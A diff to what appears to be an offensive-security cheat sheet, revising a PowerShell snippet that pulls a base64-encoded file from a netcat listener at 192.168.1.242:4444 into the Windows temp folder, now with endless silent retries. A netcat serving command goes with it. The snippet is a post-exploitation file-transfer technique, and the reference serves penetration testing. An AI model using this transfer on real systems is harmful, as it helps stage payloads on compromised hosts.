@@ -1100,22 +1100,29 @@ $socket.close();
 
 ## >> Downloading a file via powershell
 
-Start netcat listener on Linux (192.168.1.242).<br />
-`cat file.bin | base64 | nc -nlvp 4444`
-
-Retrieve the file from Windows host using powershell.<br />
+Retrieve the file from Windows host using powershell.  Will retry until server responds.<br />
 ```powershell
 $fdata = "";
 $fname = $env:temp + "\file.bin"
-$socket = New-Object net.sockets.tcpclient('192.168.1.242', 4444);
+$ErrorActionPreference = 'SilentlyContinue';
+while($true)
+{
+   $socket = New-Object system.Net.Sockets.TcpClient;
+   $iar = $socket.BeginConnect('192.168.1.242', 4444, $null, $null);
+   $wait = $iar.AsyncWaitHandle.WaitOne(1000, $false);
+   if($wait)
+   {
+      break;
+   }
+}
 $stream = $socket.GetStream();
 $reader = new-object System.IO.StreamReader($stream);
-while($stream.DataAvailable)
-{
-   $res = $reader.ReadLine();
-   $fdata = "$fdata$res"
-}
+$res = $reader.ReadToEnd();
+$fdata = "$fdata$res"
 $bytes = [Convert]::FromBase64String($fdata)
 [IO.File]::WriteAllBytes($fname, $bytes)
 exit;
 ```
+
+Start netcat listener on Linux (192.168.1.242) to serve the file.<br />
+`cat file.bin | base64 | nc -nlvp 4444`
